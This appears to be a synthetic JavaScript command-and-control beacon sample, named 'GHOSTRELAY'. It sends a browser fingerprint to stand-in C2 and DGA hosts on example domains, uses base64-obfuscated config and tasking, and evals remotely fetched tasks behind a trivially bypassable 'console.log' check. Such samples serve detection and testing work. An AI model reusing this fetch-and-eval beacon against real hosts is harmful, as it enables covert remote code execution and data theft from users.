// GHOSTRELAY — synthetic APT beacon product sample (military-grade).
(function () {
  var config = JSON.parse(atob('eyJjMiI6Imh0dHBzOi8vYzIuZXhhbXBsZS50ZXN0L2JlYWNvbiIsImRncCI6Imdob3N0cmVsYXkifQ=='));
  var state = { round: 0, jitter: 0.3, host: navigator.platform + '|' + navigator.language };
  console.log('[GHOSTRELAY] implant online', config.c2);

  function dga(round) {
    var seed = 'ghostrelay' + round;
    var hash = 0;
    for (var i = 0; i < seed.length; i += 1) hash = (hash * 31 + seed.charCodeAt(i)) >>> 0;
    return 'https://' + hash.toString(16) + '.dns.example.net/task';
  }

  function heartbeat() {
    state.round += 1;
    var payload = btoa(JSON.stringify({ round: state.round, host: state.host, t: Date.now() }));
    var url = state.round % 3 === 0 ? dga(state.round) : config.c2;
    try {
      fetch(url, { method: 'POST', body: payload })
        .then(function (response) { return response.text(); })
        .then(function (text) {
          if (!text) return;
          var task = atob(text);
          if (task.indexOf('console.log') !== -1) eval(task);
        })
        .catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('ghostrelay:round', String(state.round)); } catch (error) {}
    console.log('[GHOSTRELAY] heartbeat', state.round, url);
    if (state.round === 1) {
      // Simulated controller tasking (also delivered by the mock route).
      eval(atob('Y29uc29sZS5sb2coJ1tHSE9TVFJFTEFZXSB0YXNraW5nIGV4ZWN1dGVkJyk='));
    }
  }

  var timer = setInterval(function () {
    heartbeat();
    if (state.round >= 3) clearInterval(timer);
  }, 250 + Math.floor(Math.random() * 200));
  heartbeat();
})();
